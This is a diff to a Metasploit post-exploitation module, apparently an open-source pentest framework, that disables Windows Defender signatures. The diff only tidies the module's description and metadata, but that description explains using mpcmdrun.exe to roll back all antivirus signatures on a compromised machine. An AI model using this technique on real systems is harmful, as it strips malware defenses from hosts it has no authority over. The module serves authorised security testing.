@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Disable Windows Defender Signatures',
         'Description' => %q{
-          This module with appropriate rights let to use the Windows Defender command-line utility a run and automation
+          This module with appropriate rights uses the Windows Defender command-line utility to run an automation
           tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.
           The tool is prominently used for scheduling scans and updating the signature or definition files,
           but there is a switch created to restore the installed signature definitions to a previous backup copy or
@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Post
         'Author' => [
           'metasploit@[at]csiete.org',
           'luisco100 <luisco100[at]gmail.com>'
-        ], # Module author
+        ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
         'Actions' => [
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Post
           # if you rollback the signatures, that resource is lost
           'Stability' => [SERVICE_RESOURCE_LOSS],
           'Reliability' => [],
-          'SideEffects' => []
+          'SideEffects' => [CONFIG_CHANGES]
         }
       )
     )
